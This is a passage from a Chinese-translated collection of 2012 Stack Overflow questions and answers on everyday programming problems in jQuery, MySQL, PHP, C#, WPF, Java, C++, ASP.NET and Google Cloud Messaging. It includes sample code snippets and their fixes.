> 赞同：1
> 
> 时间：2012-11-25T04:33:28.573

在加载新内容之前，将 div 的原始内容存储在 javascript 变量中。然后检查用户是否选择了原始选项。从存储的内容中重新填充 div。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T06:07:00.427

如果内容已加载而不是重新加载，我认为您很乐意保留内容。因此，将所有内容保留在 div 中，并隐藏您不想显示的内容。

不检查错误。

```
$('#charactermenu li').click(function() {
    var selection = $(this).attr('id');

    var el=$('#coright div[data-selection="' + selection + '"]');

    // does this item not have a pane?
    if (!el.length) {
        el=$('<div/>', {class:'pane'}).data('selection', selection)
            .appendTo('#coright')
            .html(ajax_load).load( selection + ".php");
    }
    el.fadeIn().siblings().fadeOut();
    $(this).addClass('active').siblings().removeClass('active');
});

<div id="coright">
    <div class="pane" data-selection="base_chara">
        /... some content goes here
    </div>
</div> 
```

# html - 画廊不包含在正文中

> ID：13548273
> 
> 赞同：0
> 
> 时间：2012-11-25T04:26:24.233
> 
> 标签：html, css

我刚刚在文本编辑器中完成了一个图片库的工作，但是当我把它放在我的网站上时，它并没有进入网站。容器应该是屏幕的全长，顶部是标题，然后是带有画廊的正文，然后是页脚。但是我的代码没有将画廊包含在正文中。我已经尝试了我能想到的一切。这可能只是一个愚蠢的错误，但不是 zindexs，不是溢出，我不知道它是什么。我的网站位于[http://spencedesign.netau.net/singapore-gallery.html](http://spencedesign.netau.net/singapore-gallery.html)谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T04:45:00.827

这是一个将验证您所有代码的网站。我强烈建议您在复制和粘贴更多内容之前手动进行更多构建（艰难的方式），否则您最终会遇到更令人沮丧的问题。

w3.org 是查找语法以及如何在许多其他语言中使用各种 HTML 的最佳资源之一。

[问题清单](http://validator.w3.org/check?uri=http://spencedesign.netau.net/singapore-gallery.html&charset=%28detect%20automatically%29&doctype=Inline&group=0&verbose=1)

# mysql - MySQL最大连续计数查询

> ID：13548274
> 
> 赞同：3
> 
> 时间：2012-11-25T04:26:31.113
> 
> 标签：mysql, sequence, max, contiguous

有谁知道如何从表中的每一列中获取最大序列数。例如，如果表 A 包含以下数据

```
id | n1 | n2 | n3 | n4 | n5 | n6 | n7 | n8 | n9 | n10| Max | Sets
----------------------------------------------------------------
1  | 1  | 2  | 3  | 4  | 5  | 6  | 7  | 8  | 9  | 10 |  10 | 1 |
2  | 1  | 3  | 4  | 5  | 6  | 8  | 14 | 15 | 16 | 25 |  4  | 2 |
3  | 4  | 8  | 9  | 15 | 18 | 19 | 55 | 64 | 65 | 98 |  2  | 3 |
4  | 41 | 55 | 66 | 67 | 68 | 69 | 74 | 82 | 131| 132|  4  | 2 | 
```

从上表中可以看出，我需要从一行中获取最大连续数字计数，在上面的示例中，我添加了“Max”和“Sets”列以显示所需的结果。

第一行有 10 个连续数（1 到 10），只有 1 组/组连续数，第二行只有 4 个（3,4,5,6）和 2 组连续数（3 到 6和 14 至 16）。

我一直试图弄清楚这一点，但无法理解所需的查询（即加入或直接选择和 if 语句）。我可以用其他语言做到这一点，但宁愿让 MySQL 完成这个计算。

```
FOR i <= count(column)
IF count > sequence 
THEN sequence = count
ELSE count ++
NEXT i 
```

[**SQL Fiddle**](http://sqlfiddle.com/#!2/9e3cb/1)包含我的表和数据，我正在尝试进行所需的查询

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T16:20:21.417

抱歉，起初我不明白关于 SQLFiddle 的评论。我在那里测试了代码，发现我需要修复更多的东西。

查询需要将 n* 列从最终的 group-by 表达式移动到聚合，以及 ( 在第一个 FROM 和第二个 SELECT 之间。 - 并且 COUNT( *) >= 2 而不是 COUNT(* ) > 2。

现在，在您的测试代码上运行时，它可以工作了。
这是测试的 URL [http://sqlfiddle.com/#!2/9e3cb/21/0](http://sqlfiddle.com/#!2/9e3cb/21/0)

更正答案：

```
SELECT id, MAX(n1) n1, MAX(n2) n2, MAX(n3) n3, MAX(n4) n4, MAX(n5) n5,  
MAX(n6) n6, MAX(n7) n7, MAX(n8) n8, MAX(n9) n9, MAX(n10) n10,  
MAX(GrpSize) Max, COUNT(GrpNumber) Sets  
FROM (  
    SELECT id, n1, n2, n3, n4, n5, n6, n7, n8, n9, n10, GrpNumber, COUNT(*) GrpSize  
    FROM (  
        SELECT id, n1, n2, n3, n4, n5, n6, n7, n8, n9, n10,  
        CASE Numbers.N  
        WHEN 1 THEN n1 - N  
        WHEN 2 THEN n2 - N  
        WHEN 3 THEN n3 - N  
        WHEN 4 THEN n4 - N  
        WHEN 5 THEN n5 - N  
        WHEN 6 THEN n6 - N  
        WHEN 7 THEN n7 - N  
        WHEN 8 THEN n8 - N  
        WHEN 9 THEN n9 - N  
        WHEN 10 THEN n10 - N  
        END GrpNumber  
        FROM `mytbl`  
        CROSS JOIN (  
            SELECT 1 AS N UNION ALL  
            SELECT 2 AS N UNION ALL  
            SELECT 3 AS N UNION ALL  
            SELECT 4 AS N UNION ALL  
            SELECT 5 AS N UNION ALL  
            SELECT 6 AS N UNION ALL  
            SELECT 7 AS N UNION ALL  
            SELECT 8 AS N UNION ALL  
            SELECT 9 AS N UNION ALL  
            SELECT 10 AS N  
        ) Numbers  
    ) TT  
    GROUP BY id, n1, n2, n3, n4, n5, n6, n7, n8, n9, n10,GrpNumber  
    HAVING COUNT(*) >= 2  
) TT  
GROUP BY id 
```

原始答案：
这是一种使用基于集合的查询的方法。此查询假设您的表名为 TableOfTen，并且它正好有 10 个 n[number][1..10] 列。它可以针对任何预先知道 n[number][...] 列数的表（或派生表）进行修改。

```
SELECT id, n1, n2, n3, n4, n5, n6, n7, n8, n9, n10, MAX(GrpSize) MaxSize, COUNT(GrpNumber) NumberOfSetsWithTwoOrMoreMembers  
FROM  (
    SELECT id, n1, n2, n3, n4, n5, n6, n7, n8, n9, n10,GrpNumber, COUNT(*) GrpSize  
    FROM 
        SELECT id, n1, n2, n3, n4, n5, n6, n7, n8, n9, n10,  
        CASE Numbers.N  
        WHEN 1 THEN n1 - N  
        WHEN 2 THEN n2 - N  
        WHEN 3 THEN n3 - N  
        WHEN 4 THEN n4 - N  
        WHEN 5 THEN n5 - N  
        WHEN 6 THEN n6 - N  
        WHEN 7 THEN n7 - N  
        WHEN 8 THEN n8 - N  
        WHEN 9 THEN n9 - N  
        WHEN 10 THEN n10 - N  
        END GrpNumber  
        FROM `mytbl`  
        CROSS JOIN (  
            SELECT 1 AS N UNION ALL  
            SELECT 2 AS N UNION ALL  
            SELECT 3 AS N UNION ALL  
            SELECT 4 AS N UNION ALL  
            SELECT 5 AS N UNION ALL  
            SELECT 6 AS N UNION ALL  
            SELECT 7 AS N UNION ALL  
            SELECT 8 AS N UNION ALL  
            SELECT 9 AS N UNION ALL  
            SELECT 10 AS N  
        ) Numbers  
    ) TT  
    GROUP BY id, n1, n2, n3, n4, n5, n6, n7, n8, n9, n10,GrpNumber  
    HAVING COUNT(*) > 2  
) TT  
GROUP BY id, n1, n2, n3, n4, n5, n6, n7, n8, n9, n10 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T15:15:42.490

[**完整代码和演示链接**](http://sqlfiddle.com/#!2/af328/1)

```
declare c1,cnt,max,cmax,pv,cv,sets int; 
```

1.  cnt ---- 表示行数
2.  c1 ----- 循环不变量
3.  max --- 获取 10 列行中的最大连续值计数
4.  cmax -- 连续值的当前计数
5.  pv ----- 当前行的前一列值
6.  cv ----- 当前行的当前列值
7.  sets --- 告诉连续有多少组相同的最大连续计数

在解释了变量之后，我觉得也只需要讲述以下重复条件。 `if cv=pv+1 then set cmax=cmax+1; if cmax=max then set sets=sets+1; end if; if cmax>max then set max=cmax; end if; else set cmax=1;end if;set pv=cv;`

当`cv=pv+1`=> 当前列值 = 上一列时，我们将增加 cmax`cmax=cmax+1;`并且我们还需要两个检查 as `if cmax=max then sets=sets+1;`and `if cmax>max then max=cmax;`否则当`cv!=pv+1`then`cmax=1`

我使用了一个临时表，为每一行插入了 Max_Count 和 No_of_Sets 值。最后显示

希望它对您想要的有所帮助:)

# javascript - 如何使用 javascript 在 Html 中访问 HttpRequest

> ID：13548275
> 
> 赞同：1
> 
> 时间：2012-11-25T04:26:40.470
> 
> 标签：javascript, html, httprequest

我可以使用 JavaScript 访问 html 文件中的请求对象吗？我的任务是从客户端浏览器获取请求的 URL，我不能使用 window.href，因为浏览器会有不同的 url。我只能看到使用 http watch 请求的确切 url，我怎样才能获得那个特定的 url，在我的情况下，webseal 充当代理，一旦它从浏览器获得请求，它将调用我的 html 页面。如果我可以访问 java 脚本中的请求对象，我可以做 request.geturi()

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T04:45:38.550

不，你不能那样做。JavaScript 在客户端浏览器上运行，您只能访问浏览器接收到的内容

# android - 如何使用 android 开发者演示

> ID：13548278
> 
> 赞同：3
> 
> 时间：2012-11-25T04:27:30.457
> 
> 标签：android

初学者问题。我正在通过[http://developer.android.com/training/index.html](http://developer.android.com/training/index.html)上的 android 开发人员培训，并进入第二个主题“管理活动生命周期”。我已经下载了 ActivityLifecycle.zip 演示，但我不知道如何使用它。我可以将它作为项目加载到 Eclipse 中吗？我必须将其添加到现有项目中吗？我该怎么办？

-麦克风

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T04:59:50.277

在 Eclipse 中，您需要使用`File--> New Project --> Android --> Android Project from Existing Code`（至少在 Eclipse Juno 上）将其作为项目导入。

# php - 用于组合数据库中的 2 列并删除它们的特殊字符和空格的 php 函数/脚本

> ID：13548279
> 
> 赞同：0
> 
> 时间：2012-11-25T04:27:35.857
> 
> 标签：php, mysql

嗨，我正在尝试编写一个脚本，该脚本将使用 php 更新我的数据库

我需要合并数据库中的两列，删除它们的特殊字符和空格，然后将结果插入数据库的第三列

```
fn        ln       result
Super-     Man      sman
Bat&       Man      bman
Wonder -   Woman    wwoman 
```

我似乎无法用我的脚本得到我想要的结果

```
 <?php
    include('connect2.php');

    $query = mysql_query("SELECT * from alumni");
    $query = mysql_fetch_array($query);

    while($query){
    $query[ln] = str_replace(" ", "", $query[ln]); 
    $query[fn] = str_replace(" ", "", $query[fn]); 

    $query[ln] = ereg_replace("[^A-Za-z0-9]", "", $query[ln]);
    $query[fn] = ereg_replace("[^A-Za-z0-9]", "", $query[fn]);

    $query[ln] = strtolower($query[ln]);
    $query[fn] = strtolower($query[fn]);

    $query[fn] = substr($query[fn],0,1);

    printf($username = $query[fn] . $query[ln]);

    mysql_query("UPDATE alumni SET username='$username' WHERE alumni_id = $query[alumni_id]") or die(mysql_error());    
    }

    ?> 
```

谁能帮我？提前致谢

**********编辑****** ****** 终于让它工作了**

 **```
 <?php
    include('connect2.php');

    $b = mysql_query("SELECT * from alumni");

    while($a = mysql_fetch_array($b)){
        //echo $a[fn];
    $ln = str_replace(" ", "", $a[ln]); 
    $fn = str_replace(" ", "", $a[fn]); 

    $ln = ereg_replace("[^A-Za-z0-9]", "", $ln);
    $fn = ereg_replace("[^A-Za-z0-9]", "", $fn);

    $ln = strtolower($ln);
    $fn = strtolower($fn);

    $fn = substr($fn,0,1);

    printf($username = $fn . $ln);

    mysql_query("UPDATE alumni SET username='$username' where alumni_id = $a[alumni_id]") or die(mysql_error());    
    }

    ?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T04:34:51.007

我在您的代码中看到了几个问题，但要注意的最大问题如下：

```
 $query = mysql_fetch_array($query); 
```

mysql_fetch_array 函数接收结果集并返回要获取的记录的数组。使用此指令，您将用数组替换结果集，如果丢失了结果集，您将无法获取更多记录。

顺便说一句，您没有在循环中获得下一条记录。我看到了另一个问题。**

# c# - 将 Windows 窗体转换为 WPF

> ID：13548280
> 
> 赞同：0
> 
> 时间：2012-11-25T04:27:40.650
> 
> 标签：c#, wpf, winforms

以下是我在 Windows 窗体应用程序中的代码的一部分，我如何将其转换为 WPF，考虑到`this.Controls`不可用：

```
public Form1()
        {
            InitializeComponent();
            foreach (TextBox tb in this.Controls.OfType<TextBox>())
            {
                tb.Enter += textBox_Enter;
            }
        }

        void textBox_Enter(object sender, EventArgs e)
        {
            focusedTextbox = (TextBox)sender;
        }

private TextBox focusedTextbox = null;

private void button1_Click (object sender, EventArgs e)
        {
            if (focusedTextbox != null)
            {
                focusedTextbox.Text += "1";

            }
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T04:51:16.170

聆听[`PreviewGotKeyboardFocus`](http://msdn.microsoft.com/en-us/library/system.windows.uielement.previewgotkeyboardfocus.aspx)您的根元素（很可能是 Window 本身）并记录[`e.NewFocus`](http://msdn.microsoft.com/en-us/library/system.windows.input.keyboardfocuschangedeventargs.newfocus.aspx)参数。预览事件在可视化树中冒泡，因此任何在父控件中公开事件的控件都会触发它（请参阅[路由事件](http://msdn.microsoft.com/en-us/library/ms742806.aspx)）。

事件处理程序变为：

```
 private void OnGotFocusHandler(object sender, KeyboardFocusChangedEventArgs e)
    {
        var possiblyFocusedTextbox = e.NewFocus as TextBox;
        //since we are now receiving all focus changes, the possible textbox could be null
        if (possiblyFocusedTextbox != null)
            focusedTextbox = possiblyFocusedTextbox;
    } 
```

# java - java - 返回一个类的实例（数组）

> ID：13548282
> 
> 赞同：1
> 
> 时间：2012-11-25T04:27:51.747
> 
> 标签：java, android, class, object, fragment

所以我有一个类数组：

```
Class<?>[] classes; 
```

我在构造函数中填充了这些类：

```
public Sample (Class<?>[] classes){
this.classes = classes;
} 
```

然后，我有一个方法可以根据它们的索引返回其中一个类的实例：

```
public Object getInstanceOfClassWithIndex(int index){
   return new classes[index];
} 
```

不幸的是，这不起作用并导致编译错误。谢谢。任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T04:30:52.473

您应该调用[newInstance()](http://docs.oracle.com/javase/7/docs/api/java/lang/Class.html#newInstance%28%29)方法在给定索引处创建类的对象。

```
return classes[index].newInstance(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T04:32:01.783

问题是你在`new`这里有一个不必要的：

```
return new classes[index]; 
```

尝试：

```
return classes[index]; 
```

请注意，这将返回 a`Class<T>`而不是`T`. 要生成它，您需要通过`newInstance()`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-25T04:32:02.150

代替：

```
public Object getInstanceOfClassWithIndex(int index){
   return new classes[index];
} 
```

和：

```
public Object getInstanceOfClassWithIndex(int index){
   return classes[index];
} 
```

您没有创建新实例，因此`new`不需要。

# c++ - 二叉树指针错误

> ID：13548283
> 
> 赞同：2
> 
> 时间：2012-11-25T04:27:52.163
> 
> 标签：c++, pointers, recursion, tree

我有三个函数来管理二叉树：

```
static void insertion(Noeud* &top, Noeud *newNoeud)
{
    if(top == NULL)
        top = newNoeud;
    else if(newNoeud->nbr < top->nbr)
        insertion(top->left, newNoeud);
    else
        insertion(top->right, newNoeud);
}

static void affichage(Noeud* &top) //displaying
{
    if(top != NULL)
    {
        affichage(top->left);
        affichage(top->right);
        cout << "\n" << top->nbr;
    }
}

static Noeud* recherche(Noeud* &top, int nbr) //searching 
{
    while(top != NULL)
    {
        if(top->nbr == nbr)
            return(top);
        else if(nbr < top->nbr)
            top = top->left;
        else
            top = top->right;
    }
} 
```

但是我一直收到一个错误消息，说我在尝试读取内存点时违反了访问权限。我猜这与我的指针有关，但我猜不出它是什么。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T05:11:41.377

您的搜索方法使您的顶部节点不再指向`top`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T06:02:49.737

它不应该发生的`recherche`变化。`top`

这甚至编译了吗？

```
static Noeud* recherche(Noeud* &top, int nbr) //searching 
{
    while(top != NULL)
    {
        if(top->nbr == nbr)
            return(top);
        else if(nbr < top->nbr)
            top = top->left;
        else
            top = top->right;
    }
} 
```

这并不总是返回一个值......

应该是这样的：

```
static Noeud* recherche(Noeud* &top, int nbr) //searching 
{
    Noeud* it = top; //use a temporary pointer for the search.
    while(it != NULL)
    {
        if(it->nbr == nbr)
            return(it);
        else if(nbr < it->nbr)
            it = it->left;
        else
            it = it->right;
    }
    return it; //always return a value.
} 
```

# c# - asp.net - 是否有 ajax 结束事件？

> ID：13548284
> 
> 赞同：0
> 
> 时间：2012-11-25T04:28:02.150
> 
> 标签：c#, asp.net, ajax, treeview

在我的 asp.net 页面中，我使用的是树视图，并且有一个 asp 按钮控件，单击该控件时将展开树中的每个节点。

该按钮位于更新面板中，因此它使用 ajax。问题出在 ajax 调用中，我对树所做的任何更改都不起作用。

我知道树视图不能在更新面板中使用，那么有没有办法刷新树视图？

或者也许有一个ajax结束事件或什么？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T12:00:30.073

当部分回发到服务器完成时，会引发几个事件。

您可以处理 Sys.Application 对象的 load 事件或页面请求管理器的 pageLoaded 事件。最好处理 pageLoaded 事件，因为它是在代表部分请求（更新面板的内容）更新 html 之后引发的。

以下是您可以处理的现有事件的示例：

```
var requestManager = Sys.WebForms.PageRequestManager.getInstance();

requestManager.add_beginRequest(function () { Sys.Debug.trace('Begin Request event was raised.'); });
requestManager.add_endRequest(function () { Sys.Debug.trace('End Request event was raised.'); });
requestManager.add_initializeRequest(function () { Sys.Debug.trace('Initialize Request event was raised.'); });
requestManager.add_pageLoaded(function () { Sys.Debug.trace('Page Loaded event was raised.'); });
requestManager.add_pageLoading(function () { Sys.Debug.trace('Page Loading event was raised.'); });

Sys.Application.add_load(function () { Sys.Debug.trace('Application load event was raised.'); }); 
```

有关此事件的更多信息，请参阅以下文章：http: [//msdn.microsoft.com/en-us/library/bb397566%28v=vs.100%29.aspx](http://msdn.microsoft.com/en-us/library/bb397566%28v=vs.100%29.aspx)和 [http://msdn.microsoft.com /en-us/library/bb310856%28v=vs.100%29.aspx](http://msdn.microsoft.com/en-us/library/bb310856%28v=vs.100%29.aspx)

# c# - 如何在 ASP.Net 中根据角色隐藏菜单项

> ID：13548288
> 
> 赞同：4
> 
> 时间：2012-11-25T04:28:24.593
> 
> 标签：c#, asp.net, webforms

如果用户不是管理员角色，我试图从菜单项中隐藏一个项目。这是我在站点母版后面的代码中使用的代码，但该代码并未隐藏我试图隐藏它的管理页面。这是母版页的 HTML 标记：

```
 <asp:Menu ID="NavigationMenu" runat="server" CssClass="menu" EnableViewState="false"
                    IncludeStyleBlock="false" Orientation="Horizontal">
                    <Items>
                        <asp:MenuItem NavigateUrl="~/Admin/Authors.aspx" Text="Admin" />
                        <asp:MenuItem NavigateUrl="~/Users/KCA_Summary.aspx" Text="KCA Summary" />
                        <asp:MenuItem NavigateUrl="~/Users/Details.aspx" Text="KCA Details" />

                    </Items>
                </asp:Menu> 
```

这是背后的代码：

```
 Protected Sub Page_Load(sender As Object, e As EventArgs)
        If Not Roles.IsUserInRole("Admin") Then
            Dim menuItems As MenuItemCollection = NavigationMenu.Items
            Dim adminItem As New MenuItem()
            For Each menuItem As MenuItem In menuItems
                If menuItem.Text = "Admin" Then
                    adminItem = menuItem
                End If
            Next
            menuItems.Remove(adminItem)
        End If
    End Sub 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T11:35:13.747

可能最简单的方法是使用配置了= true的[SiteMapProvider 。](http://msdn.microsoft.com/en-us/library/system.web.sitemapprovider.aspx)`SecurityTrimmingEnabled`

链接的 MSDN 文章引用了许多有助于您入门的“操作方法”文章。

# c++ - 为什么 cin.getline 分配给字符数组但使用 '=' 不会？

> ID：13548290
> 
> 赞同：2
> 
> 时间：2012-11-25T04:29:45.117
> 
> 标签：c++, arrays, object, variable-assignment, getline

例如，如果我从用户那里获取学生姓名并使用，`cin.getline(student.name, 50);`我可以分配学生姓名。我不能通过显式分配学生姓名，`student.name = "John Doe";`因为您不能只复制一个数组，但是为什么当我使用 getline 函数时这会起作用？有什么区别？不是`getline()`收集字符数组然后将其复制到`studnet.name`吗？

为了澄清起见，我问为什么我可以`cin.getline(student.name, 50)`用来分配学生姓名但不能`stuent.name = "John Doe"`，这两种方法之间有什么区别（为什么`getline()`工作和直接分配不起作用）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T04:35:49.627

请参阅以下 C 常见问题解答问题 - [http://c-faq.com/aryptr/arrayassign.html](http://c-faq.com/aryptr/arrayassign.html)和[http://c-faq.com/aryptr/arraylval.html](http://c-faq.com/aryptr/arraylval.html)。

我假设这里`name`是一个`char name[something]`.

如果要分配，请使用`std::string`类型而不是`char array`

改变你的

```
char name[50]; 
```

至

```
#include <string>
using std::string;

... ...

    string name;

... ... 
```

现在您可以`=`随心所欲地使用了。

`getline`有效，因为在内部它会做这样的事情

*   读一个字符。

*   分配给名称[0]

*   阅读下一个字符。

*   分配给名称[1]。

等等。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-25T07:56:41.673

如果您查看[istream::getline](http://www.cplusplus.com/reference/istream/istream/getline/)函数的参数列表`istream& getline (char* s, streamsize n );`，您会注意到它将您的变量 ,`student.name`作为指针。这允许 getline 直接写入 c-string 的内存位置。

编辑：有关更详细的解释，请参阅评论中 Praetorian 的回答。

# php - PHP中的嵌套循环 - 布局问题

> ID：13548291
> 
> 赞同：0
> 
> 时间：2012-11-25T04:29:55.867
> 
> 标签：php, html, css

我正在构建的网站中有评论和回复部分。回复部分设置为向右移动，边距为 10%。但是当我测试代码时，它会将每个回复向右移动，而不是所有回复一起移动。我被卡住了，因为回复在评论中循环，我不知道如何解决它。这是代码...

```
 // Comments section
        // Get Username and ID from database
        if ($login->isLoggedIn()) {
            $userquery = "SELECT * FROM settings WHERE user_id=$userid";
            $usersql = mysql_query($userquery) or die('SQL Error :: '.mysql_error());
            $userqueryrow = mysql_fetch_assoc($usersql);
            $usercommentname = $userqueryrow['display_name'];
            } else {
            }

        // Posted Comments 
        $commentquery = "SELECT * FROM comments WHERE listing_id=$listingid AND response_to_id='0' ORDER BY comment_ts ASC";
        $commentsql = mysql_query($commentquery) or die('SQL Error :: '.mysql_error());

         if(mysql_num_rows($commentsql) == 0){ 
            echo '<div align="center">No comments have been posted yet.</div>';                        
                } else {    
            while($commentrow=mysql_fetch_array($commentsql))
            {
            // Get comment display name from database
            // Get Username and ID from database
            $commentid = $commentrow['comment_id'];
            $commenterid = $commentrow['user_id'];
            $commenterquery = "SELECT * FROM settings WHERE user_id=$commenterid";
            $commentersql = mysql_query($commenterquery) or die('SQL Error :: '.mysql_error());
            $commenterqueryrow = mysql_fetch_assoc($commentersql);
            $commentername = $commenterqueryrow['display_name'];
            echo '<div class="comment"><a href="mypage.php?user='.$commenterid.'">'.$commentername.'</a> said: '.stripslashes($commentrow['comment']).'';

            if ($login->isLoggedIn()) {
            // Has this user already reported this comment?
            $reportedcommentquery = "SELECT * FROM report WHERE comment_id=$commentid AND reporter_id=$userid AND listing_id=$listingid";
            $reportedcomment = mysql_query($reportedcommentquery) or die('SQL Error :: '.mysql_error());

        if (mysql_num_rows($reportedcomment) > "0") {
            echo '  <span class="small_gray">-Reported and under review-</span>';
            } else {
            echo '  <a href="item.php?item='.$listingid.'&report='.$commentid.'" class="small_graylink">Report</a>';
            }

            echo '</div>';

                // Get responses
                $responsesquery = "SELECT * FROM comments WHERE listing_id=$listingid AND response_to_id=$commentid ORDER BY comment_ts ASC";
                $responsessql = mysql_query($responsesquery) or die('SQL Error :: '.mysql_error());

                 if(mysql_num_rows($responsessql) == 0){ 
                    echo '';                        
                    } else {    
                    while($responsesrow=mysql_fetch_array($responsessql))
                    {
                    // Get responder display name from database
                    $responderid = $responsesrow['user_id'];
                    $responseid = $responsesrow['comment_id'];
                    $responderquery = "SELECT * FROM settings WHERE user_id=$responderid";
                    $respondersql = mysql_query($responderquery) or die('SQL Error :: '.mysql_error());
                    $responderqueryrow = mysql_fetch_assoc($respondersql);
                    $respondername = $responderqueryrow['display_name'];
                    $responderid = $responderqueryrow['user_id'];
                    echo '<div class="response"><a href="mypage.php?user='.$responderid.'">'.$respondername.'</a> said: '.stripslashes($responsesrow['comment']).'';

                    if ($login->isLoggedIn()) {
                        // Has this user already reported this comment?
                        $reportedresponsequery = "SELECT * FROM report WHERE comment_id=$responseid AND reporter_id=$userid AND listing_id=$listingid";
                        $reportedresponse = mysql_query($reportedresponsequery) or die('SQL Error :: '.mysql_error());

                    if (mysql_num_rows($reportedresponse) > "0") {
                    echo'  <span class="small_gray">-Reported and under review-</span>';
                    } else {
                    echo'  <a href="item.php?item='.$listingid.'&report='.$responsesrow['comment_id'].'" class="small_graylink">Report</a>';
                        }
                    }
                    }

                    echo '</div>';
                    echo '<div class="clear"></div>';
                        }
                    }

              // Response form
              if ($login->isLoggedIn()) {
              echo '<div class="responsebox">Respond to this comment:<br /><form id="newresponseto" name="newresponseto" method="post" action="item.php?item='.$listingid.'&comment='.$commentrow['comment_id'].'">
              <textarea name="new_response" cols="43" rows="2">'.$usercommentname.' says:</textarea><br />
              <input type="submit" name="Submit" value="Submit" /></form></div><hr>';
                              } else {
                              }
                }
            }

          // Comment form
          if ($login->isLoggedIn()) {
echo'         <div class="commentbox">Post a comment:<br /><form id="newcommentform" name="newcommentform" method="post" action="item.php?item='.$listingid.'">
            <textarea name="new_comment" cols="50" rows="2">'.$usercommentname.' says:</textarea><br />
            <input type="submit" name="Submit" value="Submit" />
          </form></div>';
          } else {
          echo '<div align="center">Log in to post comments or responses.</div>';
          } 
```

这是相应的CSS ..

```
.comment {
    float: left;
    width: 100%;
    background-color:#CCCCCC;
    margin-bottom: 10px;

}

.commentbox {
    float: left;
    width: 100%;
    margin-bottom: 10px;
}

.response {
    float: left;
    background-color:#EDEFF4;
    margin-bottom: 10px;

}

.responsecontainer {
    float: left;
    margin-left: 10%;
    width: 90%;
    margin-bottom: 10px;
}

.responsebox {
    float: left;
    margin-bottom: 10px;
} 
```

知道如何保持嵌套循环，但强制响应（以及实际上任何后续评论）布局而不循环左边距？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T05:31:24.523

我没有在您发布的代码中看到您调用`.responsecontainer`该类的位置，这会将左边距设置为 10%。

但是嵌套`responses`是因为你没有关闭你 `<div class="response">`的`while`循环，只有在你关闭循环后才结束。所以你会遇到这样的情况 -

```
<div class="response"><a href="mypage.php?user=1">user1</a> said: Yes
<div class="response"><a href="mypage.php?user=2">user2</a> said: I agree
<div class="response"><a href="mypage.php?user=3">user3</a> said: Are You Sure?
</div> 
```

所以最后 2 个将嵌套在第 1 个`<div>`中，而不是直接在下面。

您需要`<div class="responsecontainer">`在循环周围添加`response` `while`，然后`</div>`在循环内部添加。

截断的脚本-

```
 // Get responses
            ...
             echo '<div class="responsecontainer">';  // Add <div class="responsecontainer"> to make all responses margin-left 10% as a group 
             if(mysql_num_rows($responsessql) == 0){ 
                ...    

                while($responsesrow=mysql_fetch_array($responsessql))
                {
                // Get responder display name from database
                $responderid = $responsesrow['user_id'];
                $responseid = $responsesrow['comment_id'];
                $responderquery = "SELECT * FROM settings WHERE user_id=$responderid";
                $respondersql = mysql_query($responderquery) or die('SQL Error :: '.mysql_error());
                $responderqueryrow = mysql_fetch_assoc($respondersql);
                $respondername = $responderqueryrow['display_name'];
                $responderid = $responderqueryrow['user_id'];
                echo '<div class="response"><a href="mypage.php?user='.$responderid.'">'.$respondername.'</a> said: '.stripslashes($responsesrow['comment']).'';

                if ($login->isLoggedIn()) {
                    // Has this user already reported this comment?
                    $reportedresponsequery = "SELECT * FROM report WHERE comment_id=$responseid AND reporter_id=$userid AND listing_id=$listingid";
                    $reportedresponse = mysql_query($reportedresponsequery) or die('SQL Error :: '.mysql_error());

                if (mysql_num_rows($reportedresponse) > "0") {
                echo'  <span class="small_gray">-Reported and under review-</span>';
                } else {
                echo'  <a href="item.php?item='.$listingid.'&report='.$responsesrow['comment_id'].'" class="small_graylink">Report</a>';
                    }
                }
                echo '</div>';  // Missing </div> inside while loop
                }

                echo '</div>';  // Ends <div class="responsecontainer">
                echo '<div class="clear"></div>';
                } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T05:37:42.260

首先连接您的输出以更好地控制它..

而不是每次要打印内容时都使用 echo ：

```
echo '<div class="response"><a href="mypage.php?user='.$responderid.'">'.$respondername.'</a> said: '.stripslashes($responsesrow['comment']).''; 
```

将您的输出集中在一个变量中：

```
$output = '<div class="response">';
$output .= '<a href="mypage.php?user='.$responderid.'">'.$respondername.'</a> ';
$output .= 'said: '.stripslashes($responsesrow['comment']);
$output .= '</div>'; 
```

# android - Google Cloud Messaging 未发现身份验证挑战错误

> ID：13548292
> 
> 赞同：1
> 
> 时间：2012-11-25T04:30:04.237
> 
> 标签：android, google-cloud-messaging

**问题**

当我尝试发送 Google Cloud Messaging 消息时，我不断收到“未找到身份验证挑战”IOException 错误。

**什么**

我正在尝试使用 GCM SDK 包中的 gcm-server.jar 文件从 Android 手机发送消息。我的代码基于 GCM 文档中的服务器示例。

```
Sender sender = new Sender(MyProjectId);
Builder message = new Message.Builder();
message.collapseKey("test");
message.addData("test", "42");
Message data = message.build();
Result result = null;
try {
    result = sender.send(data, deviceID, 5);
} catch(IOException e) {
    Log.e("GCM Error", e.getMessage());
} 
```

**其他信息**

我正在尝试将推送消息从设备发送到设备，而无需“第三方”服务器参与。我不确定是否甚至可以使用 Android 手机通过 GCM 推送消息。

任何帮助或指示将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T05:08:01.723

所以看起来我的代码没有错。我在我的 apis 帐户中使用了错误的 API id。现在一切正常。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T09:46:33.287

使用来自 Google Api 控制台**的浏览器应用程序（带有引用者）**标签键下的默认 api 键

```
